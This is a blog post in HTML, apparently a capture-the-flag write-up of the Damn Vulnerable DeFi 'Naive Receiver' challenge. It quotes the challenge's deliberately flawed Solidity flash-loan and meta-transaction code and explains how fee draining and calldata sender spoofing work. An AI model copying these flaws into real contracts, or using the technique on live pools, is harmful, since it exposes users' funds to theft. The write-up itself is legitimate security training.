@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/12/18/damn-vulnerable-defi-v4-naive-receiver/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewHello everyone! Hope you are doing fantastic! This is Foued SAIDI (0xkujen), senior pentester and a wannabe Web3&#x2F;Blockhain Security Researcher. Today I am continuing my Web3&#x2F;Blockcha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Damn Vulnerable DeFi V4: Naive Receiver">
+<meta property="og:url" content="http://fouedsaidi.com/2025/12/18/Damn-Vulnerable-DeFi-V4-Naive-Receiver/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewHello everyone! Hope you are doing fantastic! This is Foued SAIDI (0xkujen), senior pentester and a wannabe Web3&#x2F;Blockhain Security Researcher. Today I am continuing my Web3&#x2F;Blockcha">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-12-18T13:54:33.000Z">
+<meta property="article:modified_time" content="2025-12-18T14:16:45.613Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Damn Vulnerable DeFi V4: Naive Receiver -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Damn Vulnerable DeFi V4: Naive Receiver</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-12-18 16:54:33</span>
+        <span class="mobile">2025-12-18 16:54:33</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-18 17:16:45</span>
+            <span class="mobile">2025-12-18 17:16:45</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Damn-Vulnerable-DeFi/">Damn Vulnerable DeFi</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        <li>
+                            | <a href="/categories/Blockchain-Web3/">Blockchain/Web3</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>Hello everyone! Hope you are doing fantastic!</p>
+<p>This is Foued SAIDI (0xkujen), senior pentester and a wannabe Web3&#x2F;Blockhain Security Researcher.</p>
+<p>Today I am continuing my Web3&#x2F;Blockchain series by tackling the second challenge from the <a class="link"   target="_blank" rel="noopener" href="https://www.damnvulnerabledefi.xyz/" >Damn Vulnerable DeFi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> series created by <a class="link"   target="_blank" rel="noopener" href="https://theredguild.org/" >The Red Guild <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> where I will be explaining in depth each challenge, my approach to solving it and my solutions.</p>
+<p>Hope you enjoy it and learn something new!</p>
+<p>Check the previous <a class="link"   target="_blank" rel="noopener" href="https://www.damnvulnerabledefi.xyz/" >Damn Vulnerable DeFi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> challenge called <code>Unstoppable</code> from <a href="https://fouedsaidi.com/2025/12/10/Damn-Vulnerable-DeFi-V4-Unstoppable/">this blog post</a>. Enjoy!</p>
+<h1 id="‘Naive-Receiver’-challenge"><a href="#‘Naive-Receiver’-challenge" class="headerlink" title="‘Naive Receiver’ challenge"></a>‘Naive Receiver’ challenge</h1><h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><p>There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract.</p>
+<p>A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.</p>
+<p>All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/" >Link to the original challenge <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/kujen5/Damn-Vulnerable-Defi-Solutions/tree/main/Naive%20Receiver" >Github repo link that contains challenge code and solver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h1 id="Understanding-the-contracts"><a href="#Understanding-the-contracts" class="headerlink" title="Understanding the contracts"></a>Understanding the contracts</h1><h2 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h2><p>We have 4 main contracts:</p>
+<h3 id="NaiveReceiverPool-sol"><a href="#NaiveReceiverPool-sol" class="headerlink" title="NaiveReceiverPool.sol"></a>NaiveReceiverPool.sol</h3><p>This contract is the main pool that will be containing the <a class="link"   target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-3156" >FlashLoan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and pool operations (<code>Withdraw</code>, <code>Deposit</code>,fees, etc.) logic.</p>
+<ol>
+<li><code>NaiveReceiverPool::flashLoan()</code> checks if the utilized token is Wrapped ETH (weth) (which is the <a class="link"   target="_blank" rel="noopener" href="https://ethereum.org/developers/docs/standards/tokens/erc-20/" >ERC20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> implementation of ETH):</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (token != <span class="title function_">address</span>(weth)) revert <span class="title class_">UnsupportedCurrency</span>();</span><br></pre></td></tr></table></figure></div>
+
+<p>Then it transfers the loan amount from the receiver and deducts that from the <code>totalDeposits</code> available in the pool. </p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weth.<span class="title function_">transfer</span>(<span class="title function_">address</span>(receiver), amount);</span><br><span class="line">totalDeposits -= amount;</span><br></pre></td></tr></table></figure></div>
+
+<p>Then the pool will asserts the borrower agrees to the terms of the loan by asserting that the <code>receiver.onFlashLoan</code> returns a <code>CALLBACK_SUCCESS</code> which is a hardcoded keccak256 of <code>ERC3156FlashBorrower.onFlashLoan</code>. This logic is implemented inside the <code>FlashLoanReceiver.sol</code> contract. </p>
+<ol start="2">
+<li><code>NaiveReceiverPool::withdraw()</code> allows any depositor to withdraw their WETH balance and send it to any receiver. It first deducts the amount from the msg sender and from the <code>totalDeposits</code>:</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deposits[<span class="title function_">_msgSender</span>()] -= amount;</span><br><span class="line">totalDeposits -= amount;</span><br></pre></td></tr></table></figure></div>
+
+<p>Then transfers it to a desired receiver:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weth.<span class="title function_">transfer</span>(receiver, amount);</span><br></pre></td></tr></table></figure></div>
+
+<ol start="3">
+<li><code>NaiveReceiverPool::_msgSender()</code> is an implementation of <a class="link"   target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-2771" >the Native Meta Transactions EIP-2771 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for sending meta transactions through a truster forwarder.<br>Basically if the msg sender is the desired forwarder of the transaction + the <code>msg.data</code> on the transaction is longer or equal to 20 bytes, then the the “real sender” must be recovered from calldata (last 20 bytes), else it will stay as the original msg.sender:</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (msg.<span class="property">sender</span> == trustedForwarder &amp;&amp; msg.<span class="property">data</span>.<span class="property">length</span> &gt;= <span class="number">20</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">address</span>(<span class="title function_">bytes20</span>(msg.<span class="property">data</span>[msg.<span class="property">data</span>.<span class="property">length</span> - <span class="number">20</span>:]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">_msgSender</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="FlashLoanReceiver-sol"><a href="#FlashLoanReceiver-sol" class="headerlink" title="FlashLoanReceiver.sol"></a>FlashLoanReceiver.sol</h3><p>Contains the <code>onFlashLoan()</code> method that implements the logic regarding the agreement between the lender and the borrower we mentioned earlier.<br>How is this even enforced?</p>
+<ol>
+<li>Only the pool can call it, not a malicious or randon contract.</li>
+<li>makes sure the pool address is not null by utilizing <code>sload</code> that loads the 32-byte value stored at the <code>pool.slot</code> (where the pool is stored) and then compares it to the <code>caller()</code> (which is the pool in this case) using <code>assembly</code> &#x3D;&gt; switching directly to EVM.</li>
+<li>Returns <code>0x48f5c3ed</code> which is the equivalent to <code>error Unauthorized()</code> by writing it as a 4-byte value into the <code>0x00</code> memory position using <code>mstore()</code> function. The memory now looks like <code>0x00 ── 48 f5 c3 ed</code>.</li>
+<li>Finally reverts with the 4-byte function selector.</li>
+<li>Then it nakes sure the token is <code>WETH</code></li>
+<li>Later it calculates the amount to be repaid by the borrower by adding the fees.</li>
+<li>Then it executes the action desired by the borrower using the obtained flashLoan</li>
+<li>Then it returns the funds to the pool by approving the pool to spend the amount the amount to be repaid.</li>
+<li>Finally it returns the keccak256 value of <code>ERC3156FlashBorrower.onFlashLoan</code> which asserts the agreement will go on as planned.</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">           <span class="comment">// gas savings</span></span><br><span class="line">           <span class="keyword">if</span> <span class="title function_">iszero</span>(<span class="params">eq(sload(pool.slot), caller())</span>) &#123;</span><br><span class="line">               <span class="title function_">mstore</span>(<span class="number">0x00</span>, <span class="number">0x48f5c3ed</span>)</span><br><span class="line">               <span class="title function_">revert</span>(<span class="number">0x1c</span>, <span class="number">0x04</span>)</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (token != <span class="title function_">address</span>(<span class="title class_">NaiveReceiverPool</span>(pool).<span class="title function_">weth</span>())) revert <span class="title class_">NaiveReceiverPool</span>.<span class="title class_">UnsupportedCurrency</span>();</span><br><span class="line"></span><br><span class="line">       uint256 amountToBeRepaid;</span><br><span class="line">       unchecked &#123;</span><br><span class="line">           amountToBeRepaid = amount + fee;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="title function_">_executeActionDuringFlashLoan</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Return funds to pool</span></span><br><span class="line">       <span class="title function_">WETH</span>(<span class="title function_">payable</span>(token)).<span class="title function_">approve</span>(pool, amountToBeRepaid);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="title function_">keccak256</span>(<span class="string">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Internal function where the funds received would be used</span></span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">_executeActionDuringFlashLoan</span>(<span class="params"></span>) internal &#123;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="BasicForwarder-sol"><a href="#BasicForwarder-sol" class="headerlink" title="BasicForwarder.sol"></a>BasicForwarder.sol</h3><ol>
+<li><code>BasicForwarder::_checkRequest()</code> enforces all necessary security guarantees.<br>First it ensures request value consistency <code>if (request.value != msg.value) revert InvalidValue();</code> (ETH mismatch, partial execution), deadline respect <code>if (block.timestamp &gt; request.deadline) revert OldRequest();</code> (replay attacks in the future), that the nonce of the signed request is valid <code>if (nonces[request.from] != request.nonce) revert InvalidNonce();</code> (replaying same nonced&#x2F;signed request).</li>
+</ol>
+<ul>
+<li>Also the target has to trust his forwarder (don’t accept from anyone.)  <code>if (IHasTrustedForwarder(request.target).trustedForwarder() != address(this)) revert InvalidTarget();</code> (no impresonation).</li>
+<li>Finally sign the request using <code>ECDSA</code>. First produce a struct hash using <code>BasicForwarder::getDataHash()</code> where every field of the request is hashed. Then uses the <a class="link"   target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-712" >EIP-712 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> through <code>EIP712::_hashTypedData()</code> which will compute the kaccak256 hash of <code>\x19\x01</code> + <code>domainSeparator</code> + <code>structHash</code>.<br>Why is this even important? &#x3D;&gt; it will bind the signature to the contract, chain and domain&#x2F;version so it cannot be replayed on another contract, chain or context.<br>It then recovers the ECDSA signature <code>r,s,v</code> to get the address that created the signature and finally compares it to the signer address : <code> if (signer != request.from) revert InvalidSigner();</code></li>
+</ul>
+<ol start="2">
+<li><code>BasicForwarder::execute()</code> is also an implementation of <strong>EIP-2771 meta-transaction forwarder</strong> which first utilizes the <code>BasicForwarder::_checkRequest()</code> to check the signature of the passed request, increases the nonce <code>nonces[request.from]++;</code> to prevent replay attacks, builds the calldata payload which will contain the request data and the sender <code>bytes memory payload = abi.encodePacked(request.data, request.from);</code>, then makes a low level assembly call to forward the call of our request and calculates the remaining gas. It will finally do some <strong>gas griefing</strong> protection where a call can forward at most <code>63/64</code> of the remaining gas.</li>
+</ol>
+<h3 id="Multicall-sol"><a href="#Multicall-sol" class="headerlink" title="Multicall.sol"></a>Multicall.sol</h3><p><code>Multicall::multicall()</code> allows us to perform multiple calls in a single transaction, single signature and single nonce.<br>It create an empty results array that has the same length of the provided data, loops over the calls and execute a delegate call with the data using the OpenZeppelin <code>Address::functionDelegateCall()</code> to execute the call as if it were a part of this contract (same <code>storage</code>, <code>msg.sender</code>, <code>msg.value</code>). Each <code>data[i]</code> contains the target function selector and its’ respective arguments. And finally returns the results:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">multicall</span>(<span class="params">bytes[] calldata data</span>) external virtual returns (bytes[] memory results) &#123;</span><br><span class="line">        results = <span class="keyword">new</span> bytes[](data.<span class="property">length</span>);</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            results[i] = <span class="title class_">Address</span>.<span class="title function_">functionDelegateCall</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Point-of-Failure"><a href="#Point-of-Failure" class="headerlink" title="Point of Failure"></a>Point of Failure</h2><p>In this amazing challenge, we have two huge issues:</p>
+<ol>
+<li>On the <code>FlashLoanReceiver::onFlashLoan()</code>, the parameters are organized as follows:</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onFlashLoan</span>(<span class="params">address, address token, uint256 amount, uint256 fee, bytes calldata</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>A huge issue here is that the <code>address</code> of the initiator is not being used&#x2F;verified.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=&gt; Anyone can request flashloans on behalf of the contract AND making the contract pay the fees. Instead of the caller paying the fees.</span><br></pre></td></tr></table></figure></div>
+
+<p>Now because the fee is fixed and independent of the loan amount, an attacker can request flash loans with <code>amount = 0</code> and still drain the receiver through repeated fee payments. This will happen even when the flash loan was forced and economically meaningless.</p>
+<ol start="2">
+<li>On the <code>NaiveReceiverPool::_msgSender()</code> method, the contract blindly trusts the last 20 bytes of calldata as the original sender whenever the call comes from <code>trustedForwarder</code>. There is no verification that the appended 20-byte address is truly the signer of the request.</li>
+</ol>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_msgSender</span>(<span class="params"></span>) internal view override returns (address) &#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.<span class="property">sender</span> == trustedForwarder &amp;&amp; msg.<span class="property">data</span>.<span class="property">length</span> &gt;= <span class="number">20</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">address</span>(<span class="title function_">bytes20</span>(msg.<span class="property">data</span>[msg.<span class="property">data</span>.<span class="property">length</span> - <span class="number">20</span>:]));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">_msgSender</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
